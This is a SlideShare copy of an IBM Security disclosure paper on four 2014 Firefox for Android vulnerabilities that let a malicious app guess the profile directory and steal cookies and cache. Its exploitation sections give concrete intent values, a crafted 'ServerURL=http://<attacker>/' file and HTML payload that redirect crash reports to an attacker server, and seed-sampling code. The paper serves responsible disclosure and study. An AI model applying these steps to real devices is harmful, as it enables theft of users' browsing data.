=== Content from www.slideshare.net_d3fff655_20250125_084607.html ===
[![SlideShare a Scribd company logo](https://public.slidesharecdn.com/images/next/svg/logo/slideshare-scribd-company.svg?w=256&q=75)](https://www.slideshare.net/ "Return to the homepage")Submit Search
# Overtaking Firefox Profiles: Vulnerabilities in Firefox for Android

•1 like•7,033 views![IBM Security](https://cdn.slidesharecdn.com/profile-photo-ibmsecurity-48x48.jpg?cb=1568311945)[IBM Security](https://www.slideshare.net/ibmsecurity "IBM Security")Follow

Abstract|We present newly-found vulnerabilities in the Firefox Android Application. Exploiting them allows a malicious application to successfully derandomize the Firefox prole directory name in a practical amount of time and exltrate sensitive data (such as cookies and cached information) which reside in that directory, breaking Android's sandbox.Read less

Read more1 of 8Download nowDownloaded 129 times![1
OVERTAKING FIREFOX PROFILES
Vulnerabilities in Firefox for Android
Roee Hay
IBM Security Systems
roeeh@il.ibm.com
Abstract—We present newly-found vulnerabili-
ties in the Firefox Android Application. Exploiting
them allows a malicious application to successfully
derandomize the Firefox proﬁle directory name in
a practical amount of time and exﬁltrate sensitive
data (such as cookies and cached information)
which reside in that directory, breaking Android’s
sandbox.
Index Terms—CVE-2014-1484; CVE-2014-
1506; CVE-2014-1515; CVE-2014-1516.
I. Android basics
A. Threat model
Android applications are executed in a sandbox
environment to ensure that no application can access
sensitive information held by another without proper
privileges. For example, Android’s browser appli-
cation holds sensitive information such as cookies,
cache and history which cannot be accessed by third-
party apps. An android application may request spe-
ciﬁc privileges (permissions) during its installation;
if granted by the user, the capabilities are extended.
Permissions are deﬁned under the application’s man-
ifest ﬁle, namely AndroidManifest.xml.
B. Activities and Services
Android applications are composed of compo-
nents of diﬀerent types including activities and
services. An Activity, implemented by the an-
droid.content.Activity class [1], deﬁnes a single
UI, e.g. a browsing window or a preferences screen.
Services [2] are application components that are used
for background tasks.
C. Inter-Process Communication (IPC) and Intents
Android applications communicate with each other
through Intents. These are messaging objects that
contain several attributes such as an action, data,
category, target and extras. The data attribute is
a URI which identiﬁes the Intent (e.g. tel:0422123).
Each Intent can also contain extra data ﬁelds, namely
Intent extras, which reside inside a Bundle (imple-
mented by the android.os.Bundle class [3]). Intent
extras can be set by using the Intent.putExtra
API or by manipulating the extras Bundle directly.
It is important to emphasize that intents provide a
channel for a malicious application to inject malicious
data into a target, potentially vulnerable application.
Intents can have either explicit or implicit destina-
tion, depending whether targets are speciﬁed or not.
Intents can be broadcast, passed to the startActiv-
ity call (when an application starts another activ-
ity), or passed to the startService call (when an
application starts a service). Under the application’s
manifest ﬁle, an application component may claim
whether it can be invoked externally using an Intent,
and if so which set of permissions is required. We
deﬁne a public application component as one which
can be invoked externally by a (potentially malicious)
application without any permissions. All other com-
ponents are deﬁned as private, i.e. they can only be
invoked by other application components of the same
package, or externally with proper privileges.
II. Generation of the Profile Directory
Firefox stores the personal data under the proﬁle
directory, located at files/mozilla/X.default/
where X is a randomly chosen 8-byte word over
the alphanumeric alphabet [a-z0-9]. The gener-
ation of X.default is implemented at GeckoPro-
file.saltProfileName (Figure II.1).
Since the proﬁle directory name is random, Firefox
stores a mapping under the files/mozilla/pro-
files.ini ﬁle (Figure II.2)
If Firefox does not ﬁnd a valid proﬁle, for example
due to a missing profiles.ini, it creates a new one
by invoking GeckoProfile.createProfileDir.
III. Vulnerabilities
A. Proﬁle Directory Name Weak Randomization
The Math.random() static method returns a uni-
formly distributed pseudo-random number between
 ](https://image.slidesharecdn.com/overtakingfirefoxprofiles-vulnerabilitiesinfirefoxforandroid-140325165210-phpapp02/85/Overtaking-Firefox-Profiles-Vulnerabilities-in-Firefox-for-Android-1-320.jpg)![2
1 private static String
2 saltProfileName ( String name)
3 {
4 String allowedChars =
5 ”abcdefghijklmnopqrstuvwxyz0123456789 ” ;
6
7 StringBuilder s a l t =
8 new StringBuilder ( 1 6 ) ;
9
10 for ( int i = 0; i < 8; i++) {
11 s a l t . append ( allowedChars . charAt (( int )
12 (Math . random () ∗
13 allowedChars . length ( ) ) ) ) ;
14 }
15 s a l t . append ( ’ . ’ ) ;
16 s a l t . append (name ) ;
17 return s a l t . toString ( ) ;
18 }
Figure II.1. GeckoProfile.saltProfileName(String name)
[Profile0]
Default=1
Name=default
IsRelative=1
Path=475jbgu6.default
[General]
StartWithLastProfile=1
Figure II.2. profiles.ini
0 and 1. In Android, the implementation is under
libcore1
:
1 public static synchronized double random ()
2 {
3 i f ( random == null )
4 {
5 random = new Random ( ) ;
6 }
7 return random . nextDouble ( ) ;
8 }
Figure III.1. Math.random()
We can see that this method relies on the
java.util.Random class which is seeded in its de-
fault constructor. In Android 4.4 and below, it is
implemented as follows2
:
1https://android.googlesource.com/platform/libcore/
2https://android.googlesource.com/platform/libcore/+/
android-4.4 r1.2/luni/src/main/java/java/util/Random.java
1 public Random()
2 {
3 setSeed ( System . currentTimeMillis ()
4 + System . identityHashCode ( this ) ) ;
5 }
Figure III.2. java.util.Random’s constructor
Therefore the seed depends on a couple of values:
1) The current time in milliseconds precision
(System.currentTimeMillis())
2) The identity hash code of the Random object
(System.identityHashCode(this))
System.identityHashCode is implemented by na-
tive code in the Dalvik VM implementation3
. The
identity hash code value is the object’s Virtual Ad-
dress (VA) which resides in the heap of the Dalvik
VM process.
GeckoProfile.saltProfileName uses
Math.random() which is cryptographically insecure.
We have seen that its seed relies on the inner-
Random object creation time (in ms precision) and
its VA. Both factors are not random. The creation
time can be leaked by an adversary (see IV-A1b)
and the VA lacks randomness due to ineﬀective
ASLR in the Dalvik VM process [4], [5]. Since the
Dalvik VM is forked from the Zygote process, the
VA of the Dalvik Heap is the same for all Android
Dalvik applications. To conclude, the seed is not
random, thus the proﬁle directory name entropy is
far from the ideal 41.36 random bits (log2 368
) and
can be predicted by the adversary as we will see
next.
B. Proﬁle Directory Name Leaks to Android System
Log
The random Proﬁle Directory Name is written to
the Android System Log (logcat) in various locations.
For instance, upon Firefox launch, the following data
is written:
D/GeckoProfile( 4766): Found profile dir:
/data/data/.../files/mozilla/24pd90uh.default
In Android 4.0 and below, the Android log can easily
be read by all applications including malicious ones
by acquiring the READ_LOGS permission. Android 4.1
has introduced a change to this behavior to prevent
such log leakage attacks: the READ_LOGS permission
is no longer required, however applications can only
listen to their own log. In section IV-B we show how
a malicious app can manipulate Firefox to leak its
own private log in order to overcome this obstacle.
3https://android.googlesource.com/platform/dalvik.git/+/
android-4.4 r1.2/vm/Sync.cpp
 ](https://image.slidesharecdn.com/overtakingfirefoxprofiles-vulnerabilitiesinfirefoxforandroid-140325165210-phpapp02/85/Overtaking-Firefox-Profiles-Vulnerabilities-in-Firefox-for-Android-2-320.jpg)![3
C. Automatic File Download to SD Card
Any ﬁle which cannot be rendered by Fire-
fox is automatically downloaded to the SD card
(/mnt/sdcard/Download), a folder which can be
read by a malicious application by acquiring the
READ_EXTERNAL_STORAGE permission. Interestingly,
this permission was not even enforced before Android
4.44
. This allows a malicious application to extract
non-renderable data such as the cookies database,
once it has managed to derandomize the proﬁle
directory name.
D. Crash Reporter File Manipulation
The org.mozilla.gecko.CrashReporter class is
a public activity. Its purpose is to send crash dumps
to Mozilla when needed (Figure III.3). The CrashRe-
porter activity receives the dump ﬁle path as an
input (an Intent extra parameter). When the activity
is launched, its onCreate method (Figure III.4) is
executed and the following actions take place:
1) Using the moveFile (Figure III.5) method, the
given minidump ﬁle is moved to the pending
minidumps path, files/mozilla/Crash Re-
ports/pending.
2) A meta-data ﬁlename is deduced from the given
minidump ﬁle path, by replacing all ’.dmp’
occurrences with ’.extra’. i.e. <filename>.dmp
becomes <filename>.extra.
3) The meta-data ﬁle is moved to the pending
minidumps path using the moveFile method.
4) The meta-data ﬁle is parsed as a key/value ﬁle
format (Figure III.6). The target server URL
(i.e. the one that the crash information is sent
to) is speciﬁed here using the ServerURL key.
5) The crash dialog is presented to the user (Fig-
ure III.3).
If the user presses the Close or Restart buttons with
the Send report check-box enabled, the minidump
alongside with other sensitive information is sent
to the speciﬁed server by calling the sendReport
method. It should be noted that if the user has
also checked the Include the address check-box, then
Android logs are sent as well.
The CrashReporter activity consumes the
minidump path from the input intent (Figure III.4,
Line 4) although it should be considered untrusted
data since the activity is public as deﬁned in
the Android Manifest ﬁle. Therefore, a malicious
application can control the source path of the
moved minidump ﬁle and the deduced extra ﬁle
4http://developer.android.com/reference/android/
Manifest.permission.html#READ EXTERNAL STORAGE
Figure III.3. Crash Reporter dialog
(Figure III.4, Lines 8, 11). We will see in the next
section that this allows that attacker to control the
destination server for the crash report, hence the
response value used as a ﬁle path in Figure III.7,
Line 19 should be untrusted as well.
IV. Exploitation
The attacker (by the use of a malicious appli-
cation) can exploit a subset of the aforementioned
vulnerabilities in order to:
1) Derandomize the proﬁle directory path.
2) Exﬁltrate sensitive data (such as cookies and
cached information) from the proﬁle directory.
In this section we describe several attractive exploita-
tion suites.
A. Suite I: Exploiting Vulnerabilities III-A, III-C and
optionally III-D
1) Derandomizing the Proﬁle Path: Let Y be the
seed chosen by Firefox. The goal of the attacker is to
derandomize it by recording some value which shares
a strong relation with it. Both the VA and the time
parts of the seed cannot be entirely determined by
the attacker, however, most of their bits can be leaked
to the attacker using simple actions:
a) Derandomizing the VA Value: To obtain
parts of the VA, as per the ineﬀective ASLR, the
attacker can query its own process using the Sys-
tem.identitiyHashCode routine on some object.
 ](https://image.slidesharecdn.com/overtakingfirefoxprofiles-vulnerabilitiesinfirefoxforandroid-140325165210-phpapp02/85/Overtaking-Firefox-Profiles-Vulnerabilities-in-Firefox-for-Android-3-320.jpg)![4
b) Derandomizing the Time Value: The ms
time value can be leaked in two diﬀerent ways.
First, if Firefox had been installed after the ma-
licious app, the latter can record the ﬁrst Firefox
run by simply monitoring the device’s process list.
Otherwise, the attacker app can exploit Vulnera-
bility III-D to move the profiles.ini ﬁle (which
has a deterministic path) to the diﬀerent direc-
tory. The exploitation is done by sending an Intent
to the Crash Reporter with minidumpPath Intent
extra set to /data/data/org.mozilla.firefox/-
files/mozilla/profiles.ini. Firefox will create a
new proﬁle on its next run, which can be forced by
crashing it (this can be done by exploiting Vulnera-
bility III-D, sending an Intent to the Crash Reporter
without a minidumpPath extra). Again the attacker
can record the Firefox launch time.
Let X be the attacker’s inaccurate sample where
X = V A + MeasuredTime. Let ε be the error,
i.e. ε = Y − X. In our brute-force attack we try
values in the order of their inferred probabilities
which can be computed oﬄine by the attacker (see
Section V). Let N be the number of attempts until
a success, then the expected number of attempts is
E(N) =
n
k=1 k·p(k) where {p(k)}n
k=1 are the ordered
inferred probabilities (p(1) ≥ p(2) ≥ · · · ≥ p(n)).
Please note that the expression for E(N) proves
that this is the optimal search algorithm (in terms
of the expectation). A simpler model is to assume
that ε is a (discrete) bell-curve with the center
estimated by ¯ε = ¯x-¯y. It can be shown that E(N) =
O(E|X − EX|) = O (σε) so a more narrow bell-
curve yields a shorter attack time (on average). By
using the inferred probabilities of ε and the sampled
seed, X, the attacker creates a list of proﬁle names
by mimicking the GeckoProfile.saltProfileName
implementation (this computation can be also done
oﬀ the device and downloaded from the attacker).
2) Data Exﬁltration: This phase is online. The
attacker creates a specially crafted world-readable
HTML ﬁle and commands Firefox to load it (by using
an Intent). This ﬁle includes the list of proﬁle names
ordered by their probabilities generated previously.
The JavaScript code in the HTML ﬁle goes over the
list, searching for the correct proﬁle. When there is
a match, it can download any ﬁle under the proﬁles
directory by creating an iframe targeting the ﬁle-
name. As per Vulnerability III-C, if Firefox cannot
render the ﬁle, it will automatically download the ﬁle
to the SD card (/mnt/sdcard/Download), a folder
which can be read by the attacker.
B. Suite II: Exploiting Vulnerabilities III-B, III-C
and optionally III-D
1) Derandomizing the Proﬁle Path : On Android
4.0 and below, the Android System Log can easily be
read by the malicious app. This allows the malicious
app to exploit Vulnerability III-B and deduce the
proﬁle directory path.
Android 4.1 prevents this attack as applications
can only listen to their own logs. Since Firefox sends
its own private log alongside the crash report (see
Section III-D) , Vulnerability III-D can be exploited
for sending the logs to the attacker:
• The malicious app creates two world
readable ﬁles under its data directory:
/data/data/<malicious app>/foo.dmp with
an arbitrary content (can be left empty) and
/data/data/<malicious app>/foo.extra
which contains the attacker’s server,
ServerURL=http://<attacker>/.
• The malicious app generates an Intent ob-
ject which targets the CrashReporter activity
with a minidumpPath parameter set to /data/-
data/<malicious app>/foo.dmp
After the above actions take place, according to the
operation of the CrashReporter activity (see Section
III-D), Firefox will move foo.dmp and foo.extra
from the malicious app data directory to the Fire-
fox crash reports pending path and then parse
foo.extra for key-value pairs. Since the extra ﬁle
now contains the attacker’s IP as the ServerURL, if
the user pressed one of the buttons on the CrashRe-
porter dialog, Firefox would send the crash report
to the attacker. If the user has also checked the
Include the address check-box, then Firefox would
also append the Android Log output, which contains
the Firefox private logs that include the random
proﬁle directory name. It should be noted that since
Firefox only sends a 200 lines window of the log, the
leaked path can be out of that window since it is
logged upon Firefox’s launch. In order to make sure
that the path is within the window, the attacker can
restart Firefox by crashing it. This can be easily done
by invoking the CrashReporter activity without a
minidumpPath parameter.
2) Data Exﬁltration: Once the attacker has learnt
the proﬁle path, he can leak ﬁles by exploiting Vul-
nerability III-C. The attacker simply invokes Firefox
using an Intent with a payload set to the target ﬁle
path.
C. Suite III: Exploiting Vulnerabilities III-B and
III-D
1) Derandomizing the Proﬁle Path Seed: This part
is exactly as described in Section IV-B1.
 ](https://image.slidesharecdn.com/overtakingfirefoxprofiles-vulnerabilitiesinfirefoxforandroid-140325165210-phpapp02/85/Overtaking-Firefox-Profiles-Vulnerabilities-in-Firefox-for-Android-4-320.jpg)![5
2) Data Exﬁltration: Here we exploit
Vulnerability III-D. We indirectly inject the
ServerURL=http://<attacker> string to the target
ﬁle and trick Firefox to use this ﬁle as the minidump
extra. For instance, by using this method, the
attacker can leak the cache. First, he opens Firefox
(using an Intent) on an attacker’s controlled website,
which contains the above string in its HTML body
(Figure IV.1). After the cache has been prepared,
the attacker can leak it by generating another Intent
that targets the CrashReporter activity, with the
minidump path parameter set to the cache ﬁle. Since
the cache ﬁle path has no ’.dmp’ substring, the
computed extra ﬁle will be the same, and the target
server URL will be parsed out of the cache ﬁle.
1 <HTML>
2 <BODY>
3 ServerURL=http : //<ATTACKER>
4 </BODY>
5 </HTML>
Figure IV.1. Injected payload into Firefox’s cache
V. Evaluation
We tested our Suite I exploit on Firefox 25.0.1
running on Samsung GT-I9500 Galaxy S4 device
equipped with Android 4.2.2. In order to infer the
probabilities of ε we ran 404 independent runs of the
following test:
1) Call Math.Random() and retrieve its identi-
tyHashCode (Figure V.1)
2) Start monitoring the process list in a frequency
of 20 Hz for recording the Firefox launch time.
3) Remove the profiles.ini ﬁle from the Firefox
directory by exploiting Vulnerability III-D.
4) Record the created proﬁle directory.
5) Kill Firefox.
6) Restart Firefox.
7) Print the needed values.
1 Math . random ( ) ;
2 Field f = Math . class .
3 getDeclaredField ( ”random ” ) ;
4 f . s e t A c c e s s i b l e ( true ) ;
5 Random r = (Random) f . get ( null ) ;
6 Long addr = System . identityHashCode ( r ) ;
Figure V.1. Retrieving the identityHashCode of the Math
inner Random object
For example, for each run we received and recorded
the following data:
Sampled VA: 42dc6cd8
Sampled Time: 1385337348079
Sampled Seed: 142cf66ccc7
Created profile: xa1x453r.default
Later we calculated the real seed and ε by an oﬄine
brute-force. For example, for the data above, the real
seed is 1386459232784 and ε = 142665.
We witnessed three strong linear correlations be-
tween Y and X (Figure V.2). We believe that the
reason for the less dense lines rely on Dalvik Heap
internals which caused the oﬀset to ’jump’ with a
ﬁxed number for a few tests (i.e. the probability for
this to happen is low).
Ϭ
ϮϬϬϬϬϬϬ
ϰϬϬϬϬϬϬ
ϲϬϬϬϬϬϬ
ϴϬϬϬϬϬϬ
ϭϬϬϬϬϬϬϬ
ϭϮϬϬϬϬϬϬ
ϭϰϬϬϬϬϬϬ
ϭϲϬϬϬϬϬϬ
Ϭ ϮϬϬϬϬϬϬ ϰϬϬϬϬϬϬ ϲϬϬϬϬϬϬ ϴϬϬϬϬϬϬ ϭϬϬϬϬϬϬϬ ϭϮϬϬϬϬϬϬ ϭϰϬϬϬϬϬϬ
Figure V.2. Linear correlation between the real seed and the
sampled one
We created a histogram for inferring the distribu-
tion of ε (Figure V.3) and calculated the expected
number of attempts, E(N), which is 152779.65 and
is equivalent to 17.22 bits. Note that the Shannon
entropy is very close, 18.63 bits. We’ve got an entropy
which is much lower than the ideal 64 bits (the java
long primitive size) seed entropy, thus the attack is
feasible.
Ϭ
Ϭ͘ϬϮ
Ϭ͘Ϭϰ
Ϭ͘Ϭϲ
Ϭ͘Ϭϴ
Ϭ͘ϭ
Ϭ͘ϭϮ
Ϭ͘ϭϰ
ͲϭϬϬϬϬϬ ϮϬϬϬϬϬ ϱϬϬϬϬϬ ϴϬϬϬϬϬ ϭϭϬϬϬϬϬ ϭϰϬϬϬϬϬ ϭϳϬϬϬϬϬ
Figure V.3. ε Histogram
We then adhered to the steps of section IV-A,
taken the simpler approach where we assert a sym-
metric bell curve. Since we received three linear
 ](https://image.slidesharecdn.com/overtakingfirefoxprofiles-vulnerabilitiesinfirefoxforandroid-140325165210-phpapp02/85/Overtaking-Firefox-Profiles-Vulnerabilities-in-Firefox-for-Android-5-320.jpg)![6
correlations, we have taken a slightly diﬀerent ap-
proach. We denote p1, p2, p3 as the probabilities for
the error to be taken from each curve and assert that
each error is normally distributed with its respective
variance (the actual discrete error is the rounded
value, see Figure V.4). Therefore ε1 ∼ N 0, σ2
1 with
probability p1 , ε2 ∼ N 0, σ2
2 with probability p2
and ε3 ∼ N 0, σ2
3 with probability p3. We brute-
force in the order of the probabilities. We ran our
exploit and successfully caused Firefox to download
sensitive ﬁles into the SD card which can be read by
the attacker (Figure V.5). It should be noted that
according to the ’normalized’ model, the expected
number of tries is 214373.3 which is equivalent to
17.709 bits.
Ϭ
Ϭ͘ϬϮ
Ϭ͘Ϭϰ
Ϭ͘Ϭϲ
Ϭ͘Ϭϴ
Ϭ͘ϭ
Ϭ͘ϭϮ
ͲϭϬϬϬϬϬ ϮϬϬϬϬϬ ϱϬϬϬϬϬ ϴϬϬϬϬϬ ϭϭϬϬϬϬϬ ϭϰϬϬϬϬϬ ϭϳϬϬϬϬϬ
Figure V.4. Normalized−ε histogram
VI. Identifiers & Fix Versions
Vulnerability CVE ID Fix Version
III-A CVE-2014-1516 TBA5
III-B CVE-2014-1484 Firefox 27
III-C CVE-2014-1515 Firefox 28.0.1
III-D CVE-2014-1506 Firefox 28
VII. Disclosure Timeline
03/25/2014 Public disclosure.
03/25/2014 Firefox 28.0.1 is released, ﬁxing
Vulnerability III-C
03/18/2014 Firefox 28 is released, ﬁxing
Vulnerability III-D
03/15/2014 Permission granted.
03/12/2014 Requested permission to disclose
Vulnerability III-A despite lack of ﬁx.
02/04/2014 Firefox 27 is released, ﬁxing
Vulnerability III-B
11/28/2013 Reported Vulnerabilities.
5As its severity is now much lower with the CVE-2014-1515
ﬁx, we were allowed by Mozilla to publicly disclose this unﬁxed
vulnerability.
Figure V.5. Automatic File Download (exploiting Vulnerabil-
ity III-C)
References
[1] Activity class reference. http://developer.android.com/
reference/android/app/Activity.html.
[2] Service class reference. http://developer.android.com/
reference/android/app/Service.html.
[3] Bundle class reference. http://developer.android.com/
reference/android/os/Bundle.html.
[4] Byoungyoung Lee, Long Lu, Tielei Wang, Taesoo Kim, and
Wenke Lee. From Zygote to Morula: Fortifying Weakened
ASLR on Android. In IEEE Symposium on Security and
Privacy, 2014.
[5] Jon Oberheide. A look at ASLR in An-
droid Ice Cream Sandwich 4.0, February
2012. https://www.duosecurity.com/blog/
a-look-at-aslr-in-android-ice-cream-sandwich-4-0.
 ](https://image.slidesharecdn.com/overtakingfirefoxprofiles-vulnerabilitiesinfirefoxforandroid-140325165210-phpapp02/85/Overtaking-Firefox-Profiles-Vulnerabilities-in-Firefox-for-Android-6-320.jpg)![7
1 @Override
2 public void onCreate ( Bundle savedInstanceState ) {
3 . . .
4 String passedMinidumpPath = getIntent ( ) . getStringExtra (PASSED MINI DUMP KEY) ;
5 F i l e passedMinidumpFile = new F i l e ( passedMinidumpPath ) ;
6 F i l e pendingDir = new F i l e ( g e t F i l e s D i r ( ) , PENDING SUFFIX) ;
7 pendingDir . mkdirs ( ) ;
8 mPendingMinidumpFile = new F i l e ( pendingDir , passedMinidumpFile . getName ( ) ) ;
9 moveFile ( passedMinidumpFile , mPendingMinidumpFile ) ;
10 F i l e e x t r a s F i l e = new F i l e ( passedMinidumpPath . r e p l a c e A l l ( ” .dmp” , ” . extra ” ) ) ;
11 mPendingExtrasFile = new F i l e ( pendingDir , e x t r a s F i l e . getName ( ) ) ;
12 moveFile ( extrasFile , mPendingExtrasFile ) ;
13 mExtrasStringMap = new HashMap<String , String >();
14 readStringsFromFile ( mPendingExtrasFile . getPath ( ) , mExtrasStringMap ) ;
15 . . .
16 }
Figure III.4. onCreate method under CrashReporter
1 private boolean moveFile ( F i l e inFile , F i l e outFile ) {
2 Log . i (LOGTAG, ”moving ” + i n F i l e + ” to ” + outFile ) ;
3 i f ( i n F i l e . renameTo ( outFile ))
4 return true ;
5 try {
6 outFile . createNewFile ( ) ;
7 Log . i (LOGTAG, ”couldn ’ t rename minidump f i l e ” ) ;
8 // so copy i t instead
9 FileChannel inChannel = new FileInputStream ( i n F i l e ) . getChannel ( ) ;
10 FileChannel outChannel = new FileOutputStream ( outFile ) . getChannel ( ) ;
11 long t r a n s f e r r e d = inChannel . transferTo (0 , inChannel . s i z e ( ) , outChannel ) ;
12 inChannel . c l o s e ( ) ;
13 outChannel . c l o s e ( ) ; pr i or to
14 i f ( t r a n s f e r r e d > 0)
15 i n F i l e . d e l e t e ( ) ;
16 } catch ( Exception e ) {
17 Log . e (LOGTAG, ”exception while copying minidump f i l e : ” , e ) ;
18 return false ;
19 }
20 return true ;
21 }
Figure III.5. moveFile method under CrashReporter
 ](https://image.slidesharecdn.com/overtakingfirefoxprofiles-vulnerabilitiesinfirefoxforandroid-140325165210-phpapp02/85/Overtaking-Firefox-Profiles-Vulnerabilities-in-Firefox-for-Android-7-320.jpg)![8
1 private boolean readStringsFromFile ( String filePath , Map<String , String> stringMap ) {
2 try {
3 BufferedReader reader = new BufferedReader (new FileReader ( f i l e P a t h ) ) ;
4 return readStringsFromReader ( reader , stringMap ) ;
5 } catch ( Exception e ) {
6 Log . e (LOGTAG, ”exception while reading s t r i n g s : ” , e ) ;
7 return false ;
8 }
9 }
10
11 private boolean readStringsFromReader ( BufferedReader reader , Map<String , String> stringMap )
12 throws IOException {
13 String l i n e ;
14 while (( l i n e = reader . readLine ( ) ) != null ) {
15 int equalsPos = −1;
16 i f (( equalsPos = l i n e . indexOf ( ’=’ )) != −1) {
17 String key = l i n e . substring (0 , equalsPos ) ;
18 String val = unescape ( l i n e . substring ( equalsPos + 1 ) ) ;
19 stringMap . put ( key , val ) ;
20 }
21 }
22 reader . c l o s e ( ) ;
23 return true ;
24 }
Figure III.6. File parsing under CrashReporter
1 private void sendReport ( F i l e minidumpFile , Map<String , String> extras , F i l e e x t r a s F i l e ) {
2 final CheckBox includeURLCheckbox = ( CheckBox ) findViewById (R. id . i n c l u d e u r l ) ;
3 String spec = extras . get (SERVER URL KEY) ;
4 . . .
5 try {
6 URL url = new URL( spec ) ;
7 HttpURLConnection conn = ( HttpURLConnection ) url . openConnection ( ) ;
8 . . .
9 i f ( Build .VERSION.SDK INT >= 16 && includeURLCheckbox . isChecked ( ) ) {
10 sendPart ( os , boundary , ”Android Logcat ” , readLogcat ( ) ) ;
11 }
12 . . .
13 sendFile ( os , boundary , MINI DUMP PATH KEY, minidumpFile ) ;
14 . . .
15 i f ( conn . getResponseCode () == HttpURLConnection .HTTP OK) {
16 F i l e submittedDir = new F i l e ( g e t F i l e s D i r ( ) , SUBMITTED SUFFIX) ;
17 . . .
18 String crashid = responseMap . get ( ”CrashID ” ) ;
19 F i l e f i l e = new F i l e ( submittedDir , crashid + ” . txt ” ) ;
20 FileOutputStream f o s = new FileOutputStream ( f i l e ) ;
21 f o s . write ( ”Crash ID : ” . getBytes ( ) ) ;
22 f o s . write ( crashid . getBytes ( ) ) ;
23 f o s . c l o s e ( ) ;
24 }
25 . . .
26 }
27 . . .
28 }
Figure III.7. sendReport under CrashReporter
 ](https://image.slidesharecdn.com/overtakingfirefoxprofiles-vulnerabilitiesinfirefoxforandroid-140325165210-phpapp02/85/Overtaking-Firefox-Profiles-Vulnerabilities-in-Firefox-for-Android-8-320.jpg)
## More Related Content

## Overtaking Firefox Profiles: Vulnerabilities in Firefox for Android

* 1. [1
  OVERTAKING FIREFOX PROFILES
  Vulnerabilities](https://www.slideshare.net/slideshow/overtaking-firefox-profiles-vulnerabilities-in-firefox-for-android/32731378#1)  in Firefox for Android
  Roee Hay
  IBM Security Systems
  roeeh@il.ibm.com
  Abstract—We present newly-found vulnerabili-
  ties in the Firefox Android Application. Exploiting
  them allows a malicious application to successfully
  derandomize the Firefox proﬁle directory name in
  a practical amount of time and exﬁltrate sensitive
  data (such as cookies and cached information)
  which reside in that directory, breaking Android’s
  sandbox.
  Index Terms—CVE-2014-1484; CVE-2014-
  1506; CVE-2014-1515; CVE-2014-1516.
  I. Android basics
  A. Threat model
  Android applications are executed in a sandbox
  environment to ensure that no application can access
  sensitive information held by another without proper
  privileges. For example, Android’s browser appli-
  cation holds sensitive information such as cookies,
  cache and history which cannot be accessed by third-
  party apps. An android application may request spe-
  ciﬁc privileges (permissions) during its installation;
  if granted by the user, the capabilities are extended.
  Permissions are deﬁned under the application’s man-
  ifest ﬁle, namely AndroidManifest.xml.
  B. Activities and Services
  Android applications are composed of compo-
  nents of diﬀerent types including activities and
  services. An Activity, implemented by the an-
  droid.content.Activity class [1], deﬁnes a single
  UI, e.g. a browsing window or a preferences screen.
  Services [2] are application components that are used
  for background tasks.
  C. Inter-Process Communication (IPC) and Intents
  Android applications communicate with each other
  through Intents. These are messaging objects that
  contain several attributes such as an action, data,
  category, target and extras. The data attribute is
  a URI which identiﬁes the Intent (e.g. tel:0422123).
  Each Intent can also contain extra data ﬁelds, namely
  Intent extras, which reside inside a Bundle (imple-
  mented by the android.os.Bundle class [3]). Intent
  extras can be set by using the Intent.putExtra
  API or by manipulating the extras Bundle directly.
  It is important to emphasize that intents provide a
  channel for a malicious application to inject malicious
  data into a target, potentially vulnerable application.
  Intents can have either explicit or implicit destina-
  tion, depending whether targets are speciﬁed or not.
  Intents can be broadcast, passed to the startActiv-
  ity call (when an application starts another activ-
  ity), or passed to the startService call (when an
  application starts a service). Under the application’s
  manifest ﬁle, an application component may claim
  whether it can be invoked externally using an Intent,
  and if so which set of permissions is required. We
  deﬁne a public application component as one which
  can be invoked externally by a (potentially malicious)
  application without any permissions. All other com-
  ponents are deﬁned as private, i.e. they can only be
  invoked by other application components of the same
  package, or externally with proper privileges.
  II. Generation of the Profile Directory
  Firefox stores the personal data under the proﬁle
  directory, located at files/mozilla/X.default/
  where X is a randomly chosen 8-byte word over
  the alphanumeric alphabet [a-z0-9]. The gener-
  ation of X.default is implemented at GeckoPro-
  file.saltProfileName (Figure II.1).
  Since the proﬁle directory name is random, Firefox
  stores a mapping under the files/mozilla/pro-
  files.ini ﬁle (Figure II.2)
  If Firefox does not ﬁnd a valid proﬁle, for example
  due to a missing profiles.ini, it creates a new one
  by invoking GeckoProfile.createProfileDir.
  III. Vulnerabilities
  A. Proﬁle Directory Name Weak Randomization
  The Math.random() static method returns a uni-
  formly distributed pseudo-random number between
* 2. [2
  1 private static](https://www.slideshare.net/slideshow/overtaking-firefox-profiles-vulnerabilities-in-firefox-for-android/32731378#2)  String
  2 saltProfileName ( String name)
  3 {
  4 String allowedChars =
  5 ”abcdefghijklmnopqrstuvwxyz0123456789 ” ;
  6
  7 StringBuilder s a l t =
  8 new StringBuilder ( 1 6 ) ;
  9
  10 for ( int i = 0; i < 8; i++) {
  11 s a l t . append ( allowedChars . charAt (( int )
  12 (Math . random () ∗
  13 allowedChars . length ( ) ) ) ) ;
  14 }
  15 s a l t . append ( ’ . ’ ) ;
  16 s a l t . append (name ) ;
  17 return s a l t . toString ( ) ;
  18 }
  Figure II.1. GeckoProfile.saltProfileName(String name)
  [Profile0]
  Default=1
  Name=default
  IsRelative=1
  Path=475jbgu6.default
  [General]
  StartWithLastProfile=1
  Figure II.2. profiles.ini
  0 and 1. In Android, the implementation is under
  libcore1
  :
  1 public static synchronized double random ()
  2 {
  3 i f ( random == null )
  4 {
  5 random = new Random ( ) ;
  6 }
  7 return random . nextDouble ( ) ;
  8 }
  Figure III.1. Math.random()
  We can see that this method relies on the
  java.util.Random class which is seeded in its de-
  fault constructor. In Android 4.4 and below, it is
  implemented as follows2
  :
  1https://android.googlesource.com/platform/libcore/
  2https://android.googlesource.com/platform/libcore/+/
  android-4.4 r1.2/luni/src/main/java/java/util/Random.java
  1 public Random()
  2 {
  3 setSeed ( System . currentTimeMillis ()
  4 + System . identityHashCode ( this ) ) ;
  5 }
  Figure III.2. java.util.Random’s constructor
  Therefore the seed depends on a couple of values:
  1) The current time in milliseconds precision
  (System.currentTimeMillis())
  2) The identity hash code of the Random object
  (System.identityHashCode(this))
  System.identityHashCode is implemented by na-
  tive code in the Dalvik VM implementation3
  . The
  identity hash code value is the object’s Virtual Ad-
  dress (VA) which resides in the heap of the Dalvik
  VM process.
  GeckoProfile.saltProfileName uses
  Math.random() which is cryptographically insecure.
  We have seen that its seed relies on the inner-
  Random object creation time (in ms precision) and
  its VA. Both factors are not random. The creation
  time can be leaked by an adversary (see IV-A1b)
  and the VA lacks randomness due to ineﬀective
  ASLR in the Dalvik VM process [4], [5]. Since the
  Dalvik VM is forked from the Zygote process, the
  VA of the Dalvik Heap is the same for all Android
  Dalvik applications. To conclude, the seed is not
  random, thus the proﬁle directory name entropy is
